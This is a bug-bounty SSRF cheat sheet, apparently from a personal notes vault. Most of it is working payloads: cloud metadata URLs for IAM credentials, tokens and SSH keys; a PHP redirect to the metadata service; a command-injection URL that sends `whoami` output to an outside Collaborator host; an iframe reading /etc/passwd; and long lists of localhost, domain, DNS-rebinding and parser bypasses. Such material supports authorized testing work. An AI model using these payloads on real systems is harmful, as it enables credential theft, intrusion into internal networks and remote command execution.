# Mindmap
![[SSRF.png]]
https://m0chan.github.io/2019/12/17/Bug-Bounty-Cheetsheet.html#server-side-request-forgery
# SSRF Techniques 
- If found try escalating to RCE. `<os cmd>`.collaborator.net
- Anything that accepts a URL
- Some website use trackers that collect User-Agent. Try blind ssrf there. (Burp collaborator everywhere)
- Change type="file" to "type=url" in [[File Upload]] functions
- For video upload use this tool. `https://github.com/neex/ffmpeg-avi-m3u-xbin`
- SSRF to XSS. Fetch a page with malicious payload. eg- http://brutelogic.com.br/poc.svg
-  Parameters for SSRF `url, ref, uri, callback`
	```
	uri=found
	uri=//169.254.169.254/latest/meta-data/iam/security-credentials/flaws/
	```
- [[AWS]] metadata.
	```
	http://169.254.169.254/latest/meta-data/  
	http://169.254.169.254/latest/user-data/  
	http://169.254.169.254/latest/meta-data/iam/security-credentials/IAM\_USER\_ROLE\_HERE  
	http://169.254.169.254/latest/meta-data/iam/security-credentials/PhotonInstance
	```
- Google Cloud 
	```
	http://metadata.google.internal/computeMetadata/v1beta1/instance/service-accounts/default/token  
	http://metadata.google.internal/computeMetadata/v1beta1/project/attributes/ssh-keys?alt=json
	```
- Digital Ocean
	```http://169.254.169.254/metadata/v1.json
	```
	Host this php code and make the application make a call to it
	```php 
	<?php header('Location: http://169.254.169.254/latest/meta-data/'); ?>
	```
- Command injection using SSRF
	```url
	url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami`
	```
- SSRF in HTML to PDF conversion'
```	"><iframe src="file:///etc/passwd"></iframe>">```
```svg/onload=document.write(document.location)>``` -- to know the path and some times to know what os they are using at backend

- URL schemes 
(`file:///`, `dict://`, `ftp://`, `gopher://`..)
- References https://medium.com/@madrobot/ssrf-server-side-request-forgery-types-and-ways-to-exploit-it-part-1-29d034c27978
- Bypass SSRF, change HTTP version 1.1 to 0.9 and remove Host header completely.
## Bypassing blacklisting and whitelisting
```url
1-http://example.com/ssrf.php?url=https://google.com (Fail)
  http://example.com/ssrf.php?url=http://abc.com/?redirect=https://google.com (Success)
  
2-https://www.mysite.com/redirect.php --> REDIRECT --> http://localhost/
```
## Server svg processor
https://github.com/allanlw/svg-cheatsheet
https://twitter.com/kunalp94/status/1502527605836173312?s=20&t=pytv2rvzxyT4gnY1UciMMQ
https://infosecwriteups.com/svg-ssrfs-and-saga-of-bypasses-777e035a17a7


## Collaborator in [[Headers]]
```Host
 Referrer: collab.com
 User-Agent: collab.com
```


## localhost WAF bypass (IP to different formats eg- Hex, Decimal, Octal)
```ip
127.0.0.1
0177.0.0.1
0x7f.0.0.1
127.0.1
127.1
2130706433
017700000001
0x7f000001
0
127.00.1
127.0.01
0.00.0
0.0.00
127.1.0.1
127.10.1
127.1.01
0177.1
0177.0001.0001
0x0.0x0.0x0.0x0
0000.0000.0000.0000
0x7f.0x0.0x0.0x1
0177.0000.0000.0001
0177.0001.0000.0001
0x7f.0x1.0x0.0x1
0x7f.0x1.0x1
127.127.127.127
127.1
127.0.1
127.0.01
127.1.0.1
127.10.1
127.1.01
127.0.1.3
127.0.0.0
3232235777 //resolves to 192.168.1.1 (default admin panel of the router)
3232235521 //resolves to 192.168.0.1 (default admin panel of the router)
```
## Domain FUZZ bypass
```url
http://{domain}@127.0.0.1
http://127.0.0.1#{domain}
http://{domain}.127.0.0.1
http://127.0.0.1/{domain}
http://127.0.0.1/?d\={domain}
https://{domain}@127.0.0.1
https://127.0.0.1#{domain}
https://{domain}.127.0.0.1
https://127.0.0.1/{domain}
https://127.0.0.1/?d\={domain}
http://{domain}@localhost
http://localhost#{domain}
http://{domain}.localhost
http://localhost/{domain}
http://localhost/?d\={domain}
http://127.0.0.1%00{domain}
http://127.0.0.1?{domain}
http://127.0.0.1///{domain}
https://127.0.0.1%00{domain}
https://127.0.0.1?{domain}
https://127.0.0.1///{domain}
```
## Bypass using DNS rebinding
```dns
localtest.me = 127.0.0.1
spoofed.burpcollaborator.net = 127.0.0.1
bugbounty.dod.network = 127.0.0.2
127.0.0.1.nip.io = 127.0.0.1              //(Resolves to the given IP)
A.178.62.122.208.1time.127.0.0.1.1time.repeat.rebind.network               //Resolves to 178.62.122.208 then 127.0.0.1 (https://github.com/brannondorsey/whonow)
```
## Weak Parser
```url
http://127.1.1.1:80\\@127.2.2.2:80/
http://127.1.1.1:80\\@@127.2.2.2:80/
http://127.1.1.1:80:\\@@127.2.2.2:80/
http://127.1.1.1:80#\\@127.2.2.2:80/
```

# Resources
https://highon.coffee/blog/ssrf-cheat-sheet/